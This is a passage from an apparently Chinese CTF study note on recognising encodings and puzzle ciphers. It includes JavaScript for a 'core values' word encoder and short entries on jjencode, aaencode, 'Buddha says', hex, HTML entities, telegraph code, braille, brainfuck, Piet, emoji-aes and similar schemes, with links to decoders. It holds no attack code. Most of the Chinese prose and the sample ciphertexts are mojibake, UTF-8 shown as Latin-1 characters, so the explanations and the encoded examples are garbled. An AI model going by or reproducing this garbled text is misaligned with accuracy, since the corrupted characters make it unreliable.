class="hljs-built_in">decodeURIComponent</span>(splited.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">hex2duo</span>(<span class="hljs-params">hexs</span>)&#123;<br>        <span class="hljs-comment">// duodecimal in array of number</span><br><br>        <span class="hljs-comment">// &#x27;0&#x27;.. &#x27;9&#x27; -&gt; 0.. 9</span><br>        <span class="hljs-comment">// &#x27;A&#x27;.. &#x27;F&#x27; -&gt; 10, c - 10    a2fFlag = 10</span><br>        <span class="hljs-comment">//          or 11, c - 6      a2fFlag = 11</span><br>        <span class="hljs-title function_">assert</span>(<span class="hljs-keyword">typeof</span> hexs === <span class="hljs-string">&#x27;string&#x27;</span>)<br><br>        <span class="hljs-keyword">const</span> duo = [];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> hexs)&#123;<br>            <span class="hljs-keyword">const</span> n = <span class="hljs-title class_">Number</span>.<span class="hljs-built_in">parseInt</span>(c, <span class="hljs-number">16</span>);<br>            <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">10</span>)&#123;<br>                duo.<span class="hljs-title function_">push</span>(n);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_">randBin</span>())&#123;<br>                    duo.<span class="hljs-title function_">push</span>(<span class="hljs-number">10</span>);<br>                    duo.<span class="hljs-title function_">push</span>(n - <span class="hljs-number">10</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    duo.<span class="hljs-title function_">push</span>(<span class="hljs-number">11</span>);<br>                    duo.<span class="hljs-title function_">push</span>(n - <span class="hljs-number">6</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> duo;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">duo2hex</span>(<span class="hljs-params">duo</span>)&#123;<br>        <span class="hljs-title function_">assert</span>(duo <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>);<br><br>        <span class="hljs-keyword">const</span> hex = [];<br><br>        <span class="hljs-keyword">const</span> l = duo.<span class="hljs-property">length</span>;<br><br>        <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span>(i &lt; l)&#123;<br>            <span class="hljs-keyword">if</span>(duo[i] &lt; <span class="hljs-number">10</span>)&#123;<br>                hex.<span class="hljs-title function_">push</span>(duo[i]);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(duo[i] === <span class="hljs-number">10</span>)&#123;<br>                    i++;<br>                    hex.<span class="hljs-title function_">push</span>(duo[i] + <span class="hljs-number">10</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    i++;<br>                    hex.<span class="hljs-title function_">push</span>(duo[i] + <span class="hljs-number">6</span>);<br>                &#125;<br>            &#125;<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> hex.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">v</span>=&gt;</span>v.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toUpperCase</span>()).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">duo2values</span>(<span class="hljs-params">duo</span>)&#123;<br>        <span class="hljs-keyword">return</span> duo.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">d</span>=&gt;</span>values[<span class="hljs-number">2</span>*d]+values[<span class="hljs-number">2</span>*d+<span class="hljs-number">1</span>]).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">valuesDecode</span>(<span class="hljs-params">encoded</span>)&#123;<br>        <span class="hljs-keyword">const</span> duo = [];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> encoded)&#123;<br>            <span class="hljs-keyword">const</span> i = values.<span class="hljs-title function_">indexOf</span>(c);<br>            <span class="hljs-keyword">if</span>(i === -<span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i &amp; <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// i is even</span><br>                duo.<span class="hljs-title function_">push</span>(i &gt;&gt; <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> hexs = <span class="hljs-title function_">duo2hex</span>(duo);<br><br>        <span class="hljs-title function_">assert</span>((hexs.<span class="hljs-property">length</span> &amp; <span class="hljs-number">1</span>) === <span class="hljs-number">0</span>);<br><br>        <span class="hljs-keyword">let</span> str;<br>        <span class="hljs-keyword">try</span>&#123;<br>            str = <span class="hljs-title function_">utf82str</span>(hexs);<br>        &#125;<span class="hljs-keyword">catch</span>(e)&#123;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>        <span class="hljs-keyword">return</span> str;<br>    &#125;<br><br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">valuesEncode</span>(<span class="hljs-params">str</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">duo2values</span>(<span class="hljs-title function_">hex2duo</span>(<span class="hljs-title function_">str2utf8</span>(str)));<br>    &#125;<br><br>    <span class="hljs-comment">// ------------------</span><br><br>    <span class="hljs-keyword">const</span> decodedArea = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;decoded-area&#x27;</span>);<br>    <span class="hljs-keyword">const</span> encodedArea = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;encoded-area&#x27;</span>);<br>    <span class="hljs-keyword">const</span> decodeBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;decode-btn&#x27;</span>);<br>    <span class="hljs-keyword">const</span> encodeBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;encode-btn&#x27;</span>);<br><br>    encodeBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span>=&gt;</span>&#123;<br>        encodedArea.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">const</span> encoded = <span class="hljs-title function_">valuesEncode</span>(decodedArea.<span class="hljs-property">value</span>);<br>        encodedArea.<span class="hljs-property">value</span> = encoded;<br>    &#125;);<br><br>    decodeBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span>=&gt;</span>&#123;<br>        decodedArea.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">const</span> decoded = <span class="hljs-title function_">valuesDecode</span>(encodedArea.<span class="hljs-property">value</span>);<br>        decodedArea.<span class="hljs-property">value</span> = decoded;<br>    &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>åˆ†æåä¸éš¾å‘ç°æœ‰ä»¥ä¸‹å‡ ç‚¹ç»“è®ºï¼š</p>
<p>1ï¼šè¡¨æ˜¯<code>å¯Œå¼º æ°‘ä¸» æ–‡æ˜ å’Œè° è‡ªç”± å¹³ç­‰ å…¬æ­£ æ³•æ²» çˆ±å›½ æ•¬ä¸š è¯šä¿¡ å‹å–„</code>ï¼Œç´¢å¼•å€¼<code>0-11</code></p>
<p>2ï¼šå­—ç¬¦ä¸²hexå€¼ä¸­çš„0-9 å¯¹åº” è¡¨ç´¢å¼•å€¼çš„0-9ã€‚æ¯”å¦‚åå…­è¿›åˆ¶çš„0ï¼Œåœ¨è¡¨ä¸­æ˜¯<code>å¯Œå¼º</code></p>
<p>3ï¼šå­—ç¬¦ä¸²hexå€¼ä¸­çš„A-F å¯¹åº” è¡¨ç´¢å¼•å€¼çš„å…³ç³»æœ‰ä¸¤ç§</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">B</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">C</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">D</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">E</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">F</span> -&gt; <span class="hljs-number">10</span> <span class="hljs-number">5</span><br><br><span class="hljs-attribute">A</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">D</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">7</span><br><span class="hljs-attribute">E</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">F</span> -&gt; <span class="hljs-number">11</span> <span class="hljs-number">9</span><br></code></pre></td></tr></table></figure>



<p>è§£é‡Šä¸€ä¸‹ä¸Šé¢çš„ç»“è®ºï¼Œä»¥<code>æˆ‘Kc !6</code>ä¸ºä¾‹å­<br>åŠ å¯†åçš„å‡ ç§ç»“æœä¸º<br><code>è¯šä¿¡è‡ªç”±å…¬æ­£çˆ±å›½çˆ±å›½æ•¬ä¸šæ°‘ä¸»è‡ªç”±è¯šä¿¡æ°‘ä¸»å…¬æ­£å’Œè°æ–‡æ˜å¯Œå¼ºæ–‡æ˜æ°‘ä¸»å’Œè°å…¬æ­£</code><br><code>è¯šä¿¡è‡ªç”±å…¬æ­£çˆ±å›½çˆ±å›½æ•¬ä¸šæ°‘ä¸»è‡ªç”±å‹å–„å¹³ç­‰å…¬æ­£å’Œè°æ–‡æ˜å¯Œå¼ºæ–‡æ˜æ°‘ä¸»å’Œè°å…¬æ­£</code><br><code>å‹å–„çˆ±å›½å…¬æ­£çˆ±å›½çˆ±å›½æ•¬ä¸šæ°‘ä¸»è‡ªç”±è¯šä¿¡æ°‘ä¸»å…¬æ­£å’Œè°æ–‡æ˜å¯Œå¼ºæ–‡æ˜æ°‘ä¸»å’Œè°å…¬æ­£</code><br><code>å‹å–„çˆ±å›½å…¬æ­£çˆ±å›½çˆ±å›½æ•¬ä¸šæ°‘ä¸»è‡ªç”±å‹å–„å¹³ç­‰å…¬æ­£å’Œè°æ–‡æ˜å¯Œå¼ºæ–‡æ˜æ°‘ä¸»å’Œè°å…¬æ­£</code></p>
<p>å…ˆå°†<code>æˆ‘Kc !6</code>ä»¥åå…­è¿›åˆ¶ç¼–ç çš„å½¢å¼è¡¨ç¤º<code>E6 88 91 4B 63 20 21 36</code></p>
<p><code>E</code>åœ¨è¡¨ä¸­æ˜¯<code>10 4</code>æˆ–è€…<code>11 8</code>ï¼Œç„¶åæ‹¿<code>10 4</code>å’Œ<code>11 8</code>åœ¨ç´¢å¼•è¡¨ä¸­æ‰¾åˆ°<code>è¯šä¿¡ è‡ªç”±</code>æˆ–è€…<code>å‹å–„ çˆ±å›½</code>ï¼Œå†æ¥ç€æ˜¯<code>6</code>ï¼Œåœ¨è¡¨ä¸­æ˜¯<code>å…¬æ­£</code>ï¼Œåé¢çš„ä»¥æ­¤ç±»æ¨ã€‚</p>
<h2 id="1-9-jjencode-x2F-aaencode"><a href="#1-9-jjencode-x2F-aaencode" class="headerlink" title="1.9. jjencode&#x2F;aaencode"></a>1.9. jjencode&#x2F;aaencode</h2><p>jjencodeä»£ç ï¼Œå°±æ˜¯å°†æ­£å¸¸çš„jsä»£ç è½¬æ¢æˆå¤æ‚çš„åªæœ‰ç¬¦å·çš„å­—ç¬¦ä¸²ç¼–ç ï¼Œè¿›è¡ŒåŠ å¯† å¦‚ï¼š<code>[$._$_]+$._$+&quot;,\\&quot;+$.$__+$.___+&quot;\\&quot;+$.__$+$.__$+$</code>è¿™æ ·çš„ç»„åˆ</p>
<p>aaencodeä»£ç ï¼Œåˆ™æ˜¯å°†æ­£å¸¸çš„jsä»£ç è½¬ä¸ºå¥½ç©çš„ç‰¹æ®Šç½‘ç»œè¡¨æƒ…ç¬¦å·ã€‚å¦‚:<code>ï¾ŸÏ‰ï¾Ÿï¾‰= /ï½€ï½Â´ï¼‰ï¾‰ ~â”»â”â”» //*Â´âˆ‡ï½€*/ [&#39;_&#39;]; o=(ï¾Ÿï½°ï¾Ÿ)</code>è¿™æ ·çš„è¡¨æƒ…æ–‡å­—</p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=703">AAEncodeåŠ å¯†&#x2F;è§£å¯†</a></p>
<p><a href="https://www.qtool.net/decode">jjencodeä¸aaencodeè§£å¯†</a></p>
<h2 id="1-10-ç†Šæ›°-x2F-æ–°ä½›æ›°-x2F-ä½›æ›°"><a href="#1-10-ç†Šæ›°-x2F-æ–°ä½›æ›°-x2F-ä½›æ›°" class="headerlink" title="1.10. ç†Šæ›°&#x2F;æ–°ä½›æ›°&#x2F;ä½›æ›°"></a>1.10. ç†Šæ›°&#x2F;æ–°ä½›æ›°&#x2F;ä½›æ›°</h2><p>ä¾‹å­ï¼š<code>ç†Šæ›°ï¼šå‘‹é£Ÿé£Ÿå’Œè¦ºå—·åšæˆ‘éº¼å•½å’¬ç›œå™”å“å™¤</code>ï¼Œ<code>æ–°ä½›æ›°ï¼šæ®¿è«¸æ®¿éš¸åƒ§é™å½æ®¿è«¸æ®¿é™€æ‘©éš¸åƒ§æ®¿ç¼½è–©é¡˜æ®¿è€¨æ®¿è«¸å›‰æ„æ®¿æ…§é¡˜æ®¿å–¼é™çœ¾æ®¿è–©éš¸æ®¿å©†æ®¿äº¦æ®¿å¦‚å›‘</code>ï¼Œ<code>ä½›æ›°ï¼šè¨¶è«³åƒ§æ¶…è«³æ³¢å¤œæ®¿è«¸å¯«å¤·é®ä¼½ç¼½å¤¢æ€¯æ˜¯åƒè€å€’æ™ºå“†æ­»å¾—å†¥ä»¥å“†å¿ƒå¤¢å‘è¬¹ä¾„æœ‹ä¿±å’’é®è«³å¤œæ‘©å‰å¤šç½°å¯¦ç­‰</code></p>
<p>ç‰¹ç‚¹ï¼šè¿™å‡ ç§ç¼–ç ç±»ä¼¼ï¼Œéƒ½æ˜¯ä»¥<code>XXæ›°ï¼š</code>å¼€å¤´ï¼Œåé¢å„ç§ç¹ä½“å­—å’Œç”Ÿåƒ»å­—</p>
<p><a href="http://hi.pcmoe.net/index.html">åœ¨çº¿ ä¸ç†Šè®ºé“&#x2F;ç†Šæ›°</a></p>
<p><a href="http://hi.pcmoe.net/buddha.html">åœ¨çº¿ æ–°çº¦ä½›è®ºç¦…</a></p>
<p><a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">åœ¨çº¿ ä¸ä½›è®ºç¦…</a></p>
<h2 id="1-11-hexç¼–ç "><a href="#1-11-hexç¼–ç " class="headerlink" title="1.11. hexç¼–ç "></a>1.11. hexç¼–ç </h2><p>åŸç†ï¼šç¼–ç æ—¶ï¼Œå°†8ä½äºŒè¿›åˆ¶ç é‡æ–°åˆ†ç»„æˆä¸¤ä¸ª4ä½çš„å­—èŠ‚ï¼ˆ8ä½&#x3D;1å­—èŠ‚ï¼Œå…¶ä¸­ä¸€ä¸ªå­—èŠ‚çš„ä½4ä½æ˜¯åŸå­—èŠ‚çš„é«˜4ä½ï¼Œå¦ä¸€ä¸ªå­—èŠ‚çš„ä½4ä½æ˜¯åŸå­—èŠ‚çš„ä½4ä½ï¼Œå…¶ä»–éƒ½è¡¥0ï¼Œç„¶åè¾“å‡ºè¿™ä¸¤ä¸ªå­—èŠ‚å¯¹åº”åå…­è¿›åˆ¶æ•°å­—ä½œä¸ºç¼–ç ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">ASCIIç ï¼š A (65)<br>äºŒè¿›åˆ¶ç ï¼š0100_0001<br>é‡æ–°åˆ†ç»„ï¼š0000_0100 0000_0001<br>åå…­è¿›åˆ¶ï¼š 4 1<br>Hexç¼–ç ï¼š41<br></code></pre></td></tr></table></figure>
<p>ç»“æœï¼šHexç¼–ç åçš„é•¿åº¦æ˜¯æºæ•°æ®çš„2å€</p>
<p>ç‰¹ç‚¹ï¼š0-9ï¼ŒA-F</p>
<h2 id="1-12-htmlç¼–ç "><a href="#1-12-htmlç¼–ç " class="headerlink" title="1.12. htmlç¼–ç "></a>1.12. htmlç¼–ç </h2><p>åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œæ˜¯HTMLç¼–å†™è¿‡ç¨‹ä¸­ä½¿ç”¨ç‰¹æ®Šçš„ç¼–ç å­—ç¬¦æ¥è¿›è¡Œç½‘é¡µé¡µé¢çš„æ­£ç¡®æ˜¾ç¤ºï¼Œæ˜¯ç½‘é¡µä¸Šé¢çš„ä¸€ç§ç¼–ç æ ¼å¼ã€‚</p>
<p>ä¾‹å­ï¼š&amp;çš„htmlå®ä½“ç¼–ç æ˜¯<code>&amp;amp;</code></p>
<p>ç‰¹ç‚¹ï¼šä»¥<code>&amp;</code>å¼€å¤´ï¼Œä»¥<code>;</code>ç»“å°¾</p>
<p><a href="https://www.codetable.net/asciikeycodes">htmlå®ä½“ç¼–ç æ‰‹å†Œ</a></p>
<h2 id="1-13-ä¸­æ–‡ç”µç "><a href="#1-13-ä¸­æ–‡ç”µç " class="headerlink" title="1.13. ä¸­æ–‡ç”µç "></a>1.13. ä¸­æ–‡ç”µç </h2><p>ä¸­æ–‡ç”µç è¡¨é‡‡ç”¨äº†å››ä½é˜¿æ‹‰ä¼¯æ•°å­—ä½œä»£å·ï¼Œä»0001åˆ°9999æŒ‰å››ä½æ•°é¡ºåºæ’åˆ—ï¼Œç”¨å››ä½æ•°å­—è¡¨ç¤ºæœ€å¤šä¸€ä¸‡ä¸ªæ±‰å­—ã€å­—æ¯å’Œç¬¦å·ã€‚æ±‰å­—å…ˆæŒ‰éƒ¨é¦–ï¼ŒåæŒ‰ç¬”åˆ’æ’åˆ—ã€‚å­—æ¯å’Œç¬¦å·æ”¾åˆ°ç”µç è¡¨çš„æœ€å°¾ã€‚</p>
<p>ä¾‹å­ï¼š<br><code>ä¸­ï¼š0022</code><br><code>æ–‡ï¼š2429</code><br><code>ç”µï¼š7193</code><br><code>ç ï¼š4316</code></p>
<p>ç‰¹ç‚¹ï¼šå››ä¸ªæ•°å­—ä¸€ç»„</p>
<p><a href="http://code.mcdvisa.com/">åœ¨çº¿æŸ¥è¯¢ä¸­æ–‡ç”µç </a></p>
<h2 id="1-14-å‡¯æ’’å¯†ç "><a href="#1-14-å‡¯æ’’å¯†ç " class="headerlink" title="1.14. å‡¯æ’’å¯†ç "></a>1.14. å‡¯æ’’å¯†ç </h2><p>å¤å…¸å¯†ç ï¼Œå•è¡¨ï¼ŒåŠ å¯†å¯é€†</p>
<h2 id="1-15-éŸ³ç¬¦"><a href="#1-15-éŸ³ç¬¦" class="headerlink" title="1.15. éŸ³ç¬¦"></a>1.15. éŸ³ç¬¦</h2><p>åŠ å¯†åå˜æˆä¸€ä¸²éŸ³ç¬¦</p>
<p>ä¾‹å­ï¼š<code>Â¶â™¯â™¬â™ªâ™«â™­â™¬Â¶â™©â™«â™¬â™ªâ™©â™©â™¬Â¶â™¬Â¶â™¯=</code></p>
<p>ç‰¹ç‚¹ï¼šå…¨éƒ¨ç”±éŸ³ä¹ç¬¦å·ç»„æˆ</p>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">åœ¨çº¿åŠ è§£å¯†</a></p>
<h2 id="1-16-ç›²æ–‡"><a href="#1-16-ç›²æ–‡" class="headerlink" title="1.16. ç›²æ–‡"></a>1.16. ç›²æ–‡</h2><blockquote>
<p>å¸ƒè±å°”åˆ›é€ çš„ç”±6ä¸ªç‚¹ä¸ºåŸºç¡€ç»“æ„çš„ç›²å­—ï¼Œåœ¨çº¸é¢ä¸Šæœ‰çš„å‡¸èµ·ï¼Œæœ‰çš„ä¸å‡¸èµ·ï¼Œå½¢æˆ64ç§å˜åŒ–ï¼Œå³64ç§ç¬¦å½¢ï¼Œåœ¨æ¯ä¸ªç¬¦å·ï¼ˆå•ä½ç§°â€æ–¹â€ï¼‰å·¦å³ä¸¤åˆ—ï¼Œæ¯åˆ—å„ä¸‰ä¸ªç‚¹ï¼Œä»å·¦è¾¹è‡ªä¸Šè€Œä¸‹å«åš1ã€2ã€3ç‚¹ï¼Œä»å³è¾¹è‡ªä¸Šè€Œä¸‹å«åš4ã€5ã€6ç‚¹ã€‚</p>
</blockquote>
<p><a href="https://unicode-table.com/cn/tools/braille/">åœ¨çº¿ç¿»è¯‘1</a></p>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">åœ¨çº¿ç¿»è¯‘2</a></p>
<blockquote>
<p>è‹±è¯­å­—æ¯ç›²æ–‡è¡¨å¦‚ä¸‹</p>
</blockquote>
<p><img src="/img/summary/misc/mangwen-1.png"></p>
<blockquote>
<p>æ•°å­—ç›²æ–‡è¡¨å¦‚ä¸‹</p>
</blockquote>
<p><img src="/img/summary/misc/mangwen-2.png"></p>
<h2 id="1-17-ook"><a href="#1-17-ook" class="headerlink" title="1.17. ook"></a>1.17. ook</h2><p>Ook! ä¸Brainfuckç±»ä¼¼, ä½†ç”¨å•è¯â€Ookâ€ï¼Œâ€Ook.â€ å’Œ â€œOok?â€ä»£æ›¿ã€‚</p>
<p><a href="https://www.splitbrain.org/_static/ook/">åœ¨çº¿ç½‘ç«™1</a><br><a href="https://ctf.bugku.com/tool/brainfuck">åœ¨çº¿ç½‘ç«™2</a></p>
<h2 id="1-18-æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µå¯†ç "><a href="#1-18-æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µå¯†ç " class="headerlink" title="1.18. æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µå¯†ç "></a>1.18. æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µå¯†ç </h2><p><img src="/img/summary/misc/bolibiao.png"></p>
<h2 id="1-19-serpent"><a href="#1-19-serpent" class="headerlink" title="1.19. serpent"></a>1.19. serpent</h2><blockquote>
<p>å¯¹ç§°å¯†é’¥å—å¯†ç </p>
</blockquote>
<p><a href="http://serpent.online-domain-tools.com/">åœ¨çº¿åŠ è§£å¯†</a></p>
<h2 id="1-20-piet"><a href="#1-20-piet" class="headerlink" title="1.20. piet"></a>1.20. piet</h2><blockquote>
<p>ç”¨ä½å›¾è‰²å—æ¥ç¼–å†™ç¨‹åº</p>
</blockquote>
<p>æœ¬åœ°å‘½ä»¤ï¼š<code>npiet.exe -q a.png</code></p>
<p><a href="https://www.bertnase.de/npiet/npiet-execute.php">åœ¨çº¿è§£é‡Šå™¨</a></p>
<p>ç‰¹ç‚¹ï¼šé¢œè‰²ä¸°å¯Œçš„å›¾ç‰‡</p>
<h2 id="1-21-å½“é“ºå¯†ç "><a href="#1-21-å½“é“ºå¯†ç " class="headerlink" title="1.21. å½“é“ºå¯†ç "></a>1.21. å½“é“ºå¯†ç </h2><p>å½“å‰æ±‰å­—æœ‰å¤šå°‘ç¬”ç”»å‡ºå¤´ï¼Œå¯¹åº”çš„æ˜æ–‡å°±æ˜¯æ•°å­—å‡ </p>
<p>ä¾‹å­:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><code class="hljs txt">å¯†æ–‡ï¼šç‹å¤« äº•å·¥ å¤«å£ ç”±ä¸­äºº äº•ä¸­ å¤«å¤« ç”±ä¸­å¤§<br>å¯¹åº”ï¼š67 84 70 123 82 77 125<br></code></pre></td></tr></table></figure>


<h2 id="1-22-brainfuck"><a href="#1-22-brainfuck" class="headerlink" title="1.22. brainfuck"></a>1.22. brainfuck</h2><blockquote>
<p>Brainfuckæ˜¯ä¸€ç§æå°åŒ–çš„è®¡ç®—æœºè¯­è¨€ï¼Œåªä½¿ç”¨8ç§ç‰¹å®šçš„ç¬¦å·</p>
</blockquote>
<p>æ³¨æ„å†…å­˜ä¸­ä¹Ÿå¯èƒ½ä¼šè—æœ‰ä¿¡æ¯ï¼Œä¾‹å¦‚2023å¹´ç¾ŠåŸæ¯çš„GIFuck</p>
<p><a href="https://www.splitbrain.org/services/ook">åœ¨çº¿è½¬æ¢1</a>ï¼Œ<a href="https://www.dcode.fr/brainfuck-language">åœ¨çº¿è½¬æ¢2</a></p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">+++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">++</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">+++</span>&lt;<span class="hljs-title">]</span> &gt;<span class="hljs-literal">++++</span> <span class="hljs-literal">++++</span><span class="hljs-string">.</span> <span class="hljs-literal">-----</span> <span class="hljs-literal">--</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+</span> <span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span> &gt;<span class="hljs-literal">++++</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">++</span><br><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">--</span> <span class="hljs-literal">-</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">-</span> <span class="hljs-literal">----</span><span class="hljs-string">.</span> &lt;<span class="hljs-literal">+++</span><span class="hljs-title">[</span> <span class="hljs-literal">-</span>&gt;<span class="hljs-literal">+++</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span> &lt;<span class="hljs-literal">+++</span><span class="hljs-title">[</span> <span class="hljs-literal">-</span>&gt;<span class="hljs-literal">---</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">--</span> <span class="hljs-literal">---</span><span class="hljs-string">.</span>&lt; <span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span><br>&gt;<span class="hljs-literal">+++</span>&lt; <span class="hljs-title">]</span>&gt;<span class="hljs-literal">+++</span> <span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">---</span> <span class="hljs-literal">-----</span> <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span>&lt;<br></code></pre></td></tr></table></figure>

<h2 id="1-23-BubbleBabbleç¼–ç "><a href="#1-23-BubbleBabbleç¼–ç " class="headerlink" title="1.23. BubbleBabbleç¼–ç "></a>1.23. BubbleBabbleç¼–ç </h2><p>ç‰¹å¾ï¼šäº”ä½å°å†™å­—æ¯ä¸€ç»„ï¼Œä»¥<code>-</code>åˆ†å‰²</p>
<p>ä¾‹å­ï¼š<code>xipak-herek-serid-bapok-horek-syrox</code></p>
<p><a href="http://www.hiencode.com/bubble.html">åœ¨çº¿å·¥å…·</a></p>
<h2 id="1-24-é˜´é˜³æ€ªæ°”ç¼–ç "><a href="#1-24-é˜´é˜³æ€ªæ°”ç¼–ç " class="headerlink" title="1.24. é˜´é˜³æ€ªæ°”ç¼–ç "></a>1.24. é˜´é˜³æ€ªæ°”ç¼–ç </h2><p>ç‰¹å¾ï¼š<code>[&#39;å°± è¿™ Â¿ &#39;, &#39;ä¸ ä¼š å§ ï¼Ÿ &#39;]</code></p>
<p><a href="https://github.com/mmdjiji/yygq.js">GitHubé¡¹ç›®åœ°å€</a></p>
<p><a href="https://mmdjiji.gitee.io/yygq.js/">åœ¨çº¿ç¼–ç è§£å¯†</a></p>
<h2 id="1-25-emoji-or-emoji-aes"><a href="#1-25-emoji-or-emoji-aes" class="headerlink" title="1.25. emoji or emoji-aes"></a>1.25. emoji or emoji-aes</h2><p>ç‰¹å¾ï¼šéƒ½ç”±è¡¨æƒ…ç¬¦å·ç»„æˆ</p>
<p>emoji-aeså®é™…ä¸Šå°±æ˜¯aesåŠ å¯†æ–‡æœ¬ï¼Œç”¨ä¸€ä¸ªkeyå½“ä½œåç§»ï¼Œåœ¨è¡¨æƒ…å­—å…¸ä¸­å¯¹åº”</p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=937">emojiåœ¨çº¿</a></p>
<p><a href="https://aghorler.github.io/emoji-aes/">emoji-aesåœ¨çº¿</a></p>
<h2 id="1-26-codemoji"><a href="#1-26-codemoji" class="headerlink" title="1.26 codemoji"></a>1.26 codemoji</h2><p>ç‰¹å¾æ˜¯keyå’Œå¯†æ–‡ä¸ºè¡¨æƒ…ç¬¦å·</p>
<p><a href="https://codemoji.miaotony.xyz/#/encrypt">codemoji-encrypt</a><br><a href="https://codemoji.miaotony.xyz/cracker/">codemoji-cracker</a></p>
<h2 id="1-27-solfa-cipher"><a href="#1-27-solfa-cipher" class="headerlink" title="1.27 solfa-cipher"></a>1.27 solfa-cipher</h2><p>éŸ³ä¹å¯†ç </p>
